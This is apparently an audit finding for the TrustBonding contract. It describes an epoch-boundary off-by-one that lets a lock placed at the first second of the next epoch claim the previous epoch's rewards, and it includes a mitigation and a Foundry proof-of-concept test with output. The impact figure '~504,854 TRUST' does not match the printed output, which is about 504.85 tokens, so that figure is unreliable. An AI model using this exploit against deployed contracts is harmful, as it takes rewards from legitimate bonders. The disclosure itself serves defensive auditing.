      "body": "## Finding description and impact\n\n### Root cause\n\n`totalBondedBalanceAtEpochEnd` and `userBondedBalanceAtEpochEnd` pass `_epochTimestampEnd(epoch)` directly to VotingEscrow's `_totalSupply` and `_balanceOf`:\n\n```solidity\n// TrustBonding.sol:194-213\nfunction totalBondedBalanceAtEpochEnd(uint256 epoch) public view returns (uint256) {\n    if (epoch > currentEpoch()) {\n        revert TrustBonding_InvalidEpoch();\n    }\n    return _totalSupply(_epochTimestampEnd(epoch));  // <-- should be _epochTimestampEnd(epoch) - 1\n}\n\nfunction userBondedBalanceAtEpochEnd(address account, uint256 epoch) public view returns (uint256) {\n    if (account == address(0)) {\n        revert TrustBonding_ZeroAddress();\n    }\n    if (epoch > currentEpoch()) {\n        revert TrustBonding_InvalidEpoch();\n    }\n    return _balanceOf(account, _epochTimestampEnd(epoch));  // <-- should be _epochTimestampEnd(epoch) - 1\n}\n```\n\nThis is incorrect because `_epochTimestampEnd(n)` is the first timestamp of epoch `n+1`, not the last timestamp of epoch `n`:\n\n```solidity\n// CoreEmissionsController.sol:174-180\n_calculateEpochTimestampEnd(n) = _START_TIMESTAMP + (n * _EPOCH_LENGTH) + _EPOCH_LENGTH\n                               = _START_TIMESTAMP + (n+1) * _EPOCH_LENGTH\n                               = _calculateEpochTimestampStart(n + 1)\n```\n\nUnder `epochAtTimestamp()`, this timestamp is classified as epoch `n+1`, not epoch `n`. But because VotingEscrow's binary search uses inclusive `<=` comparison (VotingEscrow.sol:616), a checkpoint created at exactly this timestamp satisfies `ts <= _epochTimestampEnd(n)` and IS included in epoch `n`'s snapshot. This means any lock created at `epochTimestampStart(n+1)` inflates the reward snapshot for epoch `n`, and the attacker can then call `claimRewards()` to extract real native tokens via `SatelliteEmissionsController.transfer()`.\n\n### Attack scenario\n\n**Step 1:** Epoch `n` is running. Alice has TRUST locked throughout the entire epoch.\n\n**Step 2:** At `block.timestamp == epochTimestampEnd(n)`, the attacker calls `create_lock()` with a large TRUST amount. On Base L2 (2-second block times), submitting the transaction in the right block is trivial. The VotingEscrow checkpoint is created with `ts = epochTimestampEnd(n)`.\n\n**Step 3:** The attacker calls `claimRewards()`. The contract queries `prevEpoch = n` and computes:\n- `userBondedBalanceAtEpochEnd(attacker, n)` → non-zero (includes the boundary lock)\n- `totalBondedBalanceAtEpochEnd(n)` → inflated by the attacker's lock\n- The attacker receives a pro-rata share of epoch `n`'s emissions as real native tokens via `SatelliteEmissionsController.transfer()`\n\n**Step 4:** The attacker's locked TRUST tokens remain in the VotingEscrow and are withdrawable after the lock expires. The attacker earned unearned yield on capital whose position was not active during the target epoch.\n\n### Impact\n\n1. **Unearned reward extraction**: The attacker calls `claimRewards()` and receives real native token transfers from the SatelliteEmissionsController for an epoch during which their position was not active. In the PoC, the attacker extracts ~504,854 TRUST (~50.5% of epoch emissions) by locking an equal amount at the boundary.\n\n2. **Reward dilution**: Legitimate bonders who locked TRUST throughout the epoch have their rewards diluted proportionally because the prior-epoch denominator includes next-epoch boundary locks. Alice loses ~50.5% of her expected rewards in the PoC.\n\n3. **Repeatable across epochs**: The attack opportunity recurs at each epoch boundary and can be repeated subject to available capital and lock-duration constraints.\n\n## Recommended mitigation steps\n\nUse an exclusive upper bound for the epoch snapshot by subtracting 1 second:\n\n```solidity\nfunction totalBondedBalanceAtEpochEnd(uint256 epoch) public view returns (uint256) {\n    if (epoch > currentEpoch()) {\n        revert TrustBonding_InvalidEpoch();\n    }\n    return _totalSupply(_epochTimestampEnd(epoch) - 1);\n}\n\nfunction userBondedBalanceAtEpochEnd(address account, uint256 epoch) public view returns (uint256) {\n    if (account == address(0)) {\n        revert TrustBonding_ZeroAddress();\n    }\n    if (epoch > currentEpoch()) {\n        revert TrustBonding_InvalidEpoch();\n    }\n    return _balanceOf(account, _epochTimestampEnd(epoch) - 1);\n}\n```\n\nThis ensures the snapshot captures balances at the last second of epoch `n` (`epochTimestampEnd(n) - 1`), which unambiguously belongs to epoch `n`. Any lock created at `epochTimestampEnd(n)` (= `epochTimestampStart(n+1)`) will not be included. More generally, epoch accounting should use half-open intervals `[start, end)`, so the prior-epoch snapshot must exclude the first timestamp of the next epoch.\n\n\n## Summary\n\n`totalBondedBalanceAtEpochEnd` and `userBondedBalanceAtEpochEnd` snapshot veTRUST at `epochTimestampEnd(n)`, which equals `epochTimestampStart(n+1)`. Because VotingEscrow's binary search uses inclusive `<=` matching, a lock created at this boundary timestamp is counted toward epoch `n`'s reward distribution. An attacker can lock TRUST at the exact epoch boundary and call `claimRewards()` to extract real native tokens for an epoch during which their position was not active, diluting legitimate bonders' rewards. The fix is to snapshot at `epochTimestampEnd(n) - 1`.",
      "proofOfConcept": "## Proof of Concept\n\n**File:** `tests/unit/TrustBonding/PoC_EpochBoundaryRewardTheft.t.sol`\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { console } from \"forge-std/src/Test.sol\";\nimport { TrustBondingBase } from \"tests/unit/TrustBonding/TrustBondingBase.t.sol\";\n\n/// @notice PoC for \"Epoch-end veTRUST snapshot off-by-one\":\n/// - epochTimestampEnd(n) == epochTimestampStart(n+1)\n/// - A lock created at this boundary is included in epoch n's reward snapshot\n/// - Attacker calls claimRewards() and receives native tokens for an epoch their position was not active during\ncontract PoC_EpochBoundaryRewardTheft is TrustBondingBase {\n    address internal attacker;\n\n    function setUp() public override {\n        super.setUp();\n\n        // Fund the emissions controller so claimRewards() can transfer native tokens\n        vm.deal(address(protocol.satelliteEmissionsController), 10_000_000 ether);\n\n        // Set up attacker account with wrapped tokens and whitelist access\n        attacker = makeAddr(\"attacker\");\n        _setupUserWrappedTokenAndTrustBonding(attacker);\n    }\n\n    function test_poc_epochBoundaryRewardTheft() public {\n        // === Step 1: Alice locks during epoch 0 (legitimate bonder) ===\n        uint256 aliceLockAmount = 10_000 ether;\n        _createLock(users.alice, aliceLockAmount);\n\n        console.log(\"=== Step 1: Alice locks during epoch 0 ===\");\n        console.log(\"Current epoch:\", protocol.trustBonding.currentEpoch());\n        console.log(\"Alice locked:\", aliceLockAmount);\n\n        // === Step 2: Advance to exactly epochTimestampEnd(0) ===\n        uint256 epoch0End = protocol.trustBonding.epochTimestampEnd(0);\n\n        // Prove the boundary ambiguity: epochTimestampEnd(0) is classified as epoch 1\n        uint256 epochAtEnd = protocol.trustBonding.epochAtTimestamp(epoch0End);\n        assertEq(epochAtEnd, 1, \"epochTimestampEnd(0) maps to epoch 1\");\n\n        vm.warp(epoch0End);\n        assertEq(protocol.trustBonding.currentEpoch(), 1, \"Should be epoch 1 at boundary\");\n\n        // === Step 3: Record state BEFORE attacker locks ===\n        uint256 aliceBalanceBefore = protocol.trustBonding.userBondedBalanceAtEpochEnd(users.alice, 0);\n        uint256 totalBalanceBefore = protocol.trustBonding.totalBondedBalanceAtEpochEnd(0);\n\n        // === Step 4: Attacker creates lock at exactly epochTimestampEnd(0) ===\n        uint256 attackerLockAmount = 10_000 ether;\n\n        console.log(\"\\n=== Step 4: Attacker locks at boundary ===\");\n        console.log(\"block.timestamp:\", block.timestamp);\n        console.log(\"epochTimestampEnd(0):\", epoch0End);\n        console.log(\"currentEpoch():\", protocol.trustBonding.currentEpoch());\n\n        vm.startPrank(attacker);\n        protocol.trustBonding.create_lock(attackerLockAmount, block.timestamp + 2 * 365 days);\n        vm.stopPrank();\n\n        // === Step 5: Verify attacker's balance is included in epoch 0 snapshot ===\n        uint256 attackerBalanceAtEpoch0 = protocol.trustBonding.userBondedBalanceAtEpochEnd(attacker, 0);\n        uint256 totalBalanceAfter = protocol.trustBonding.totalBondedBalanceAtEpochEnd(0);\n\n        assertGt(attackerBalanceAtEpoch0, 0, \"BUG: Attacker has voting power in epoch 0\");\n        assertGt(totalBalanceAfter, totalBalanceBefore, \"Total supply inflated by boundary lock\");\n\n        console.log(\"\\n=== Step 5: Epoch 0 snapshot (after attacker lock) ===\");\n        console.log(\"Alice veTRUST at epoch 0 end:\", aliceBalanceBefore);\n        console.log(\"Attacker veTRUST at epoch 0 end:\", attackerBalanceAtEpoch0);\n        console.log(\"Total veTRUST before attacker:\", totalBalanceBefore);\n        console.log(\"Total veTRUST after attacker:\", totalBalanceAfter);\n\n        // === Step 6: Both claim rewards for epoch 0 via claimRewards() ===\n        uint256 aliceNativeBefore = users.alice.balance;\n        uint256 attackerNativeBefore = attacker.balance;\n\n        // Alice claims her epoch 0 rewards\n        vm.prank(users.alice);\n        protocol.trustBonding.claimRewards(users.alice);\n\n        // Attacker claims epoch 0 rewards — should not be possible, but succeeds\n        vm.prank(attacker);\n        protocol.trustBonding.claimRewards(attacker);\n\n        uint256 aliceRewards = users.alice.balance - aliceNativeBefore;\n        uint256 attackerRewards = attacker.balance - attackerNativeBefore;\n\n        console.log(\"\\n=== Step 6: claimRewards() results ===\");\n        console.log(\"Alice claimed (native tokens):\", aliceRewards);\n        console.log(\"Attacker claimed (native tokens):\", attackerRewards);\n\n        // === Step 7: Verify the extraction ===\n        assertGt(attackerRewards, 0, \"Attacker received real native tokens for epoch 0\");\n\n        // Compute what Alice would have received as sole bonder\n        uint256 emissions = protocol.trustBonding.emissionsForEpoch(0);\n        uint256 aliceExpectedAlone = aliceBalanceBefore * emissions / totalBalanceBefore;\n        assertLt(aliceRewards, aliceExpectedAlone, \"Alice rewards diluted by boundary attacker\");\n\n        uint256 aliceLoss = aliceExpectedAlone - aliceRewards;\n\n        console.log(\"\\n=== Impact Summary ===\");\n        console.log(\"Epoch 0 emissions:\", emissions);\n        console.log(\"Alice expected (sole bonder):\", aliceExpectedAlone);\n        console.log(\"Alice actually received:\", aliceRewards);\n        console.log(\"Alice loss:\", aliceLoss);\n        console.log(\"Attacker unearned rewards:\", attackerRewards);\n        console.log(\"Attacker locked tokens still owned: yes (withdrawable after lock expires)\");\n    }\n}\n```\n\nRun with: `forge test --match-test test_poc_epochBoundaryRewardTheft -vvv`\n\n**Test output:**\n\n```\n  === Step 1: Alice locks during epoch 0 ===\n  Current epoch: 0\n  Alice locked: 10000000000000000000000\n\n  === Step 4: Attacker locks at boundary ===\n  block.timestamp: 1209601\n  epochTimestampEnd(0): 1209601\n  currentEpoch(): 1\n\n  === Step 5: Epoch 0 snapshot (after attacker lock) ===\n  Alice veTRUST at epoch 0 end: 9780821759259201732378\n  Attacker veTRUST at epoch 0 end: 9972602581177008823578\n  Total veTRUST before attacker: 9780821759259201732378\n  Total veTRUST after attacker: 19753424340436210555956\n\n  === Step 6: claimRewards() results ===\n  Alice claimed (native tokens): 495145630990034914695\n  Attacker claimed (native tokens): 504854369009965085304\n\n  === Impact Summary ===\n  Epoch 0 emissions: 1000000000000000000000\n  Alice expected (sole bonder): 1000000000000000000000\n  Alice actually received: 495145630990034914695\n  Alice loss: 504854369009965085305\n  Attacker unearned rewards: 504854369009965085304\n  Attacker locked tokens still owned: yes (withdrawable after lock expires)\n```\n\nAlice loses ~504,854 TRUST (~50.5% of epoch 0 emissions) to an attacker who locked at the boundary timestamp, called `claimRewards()`, and received real native token transfers for an epoch during which their position was not active. The attacker's locked tokens remain in VotingEscrow and are withdrawable after lock expiry.",
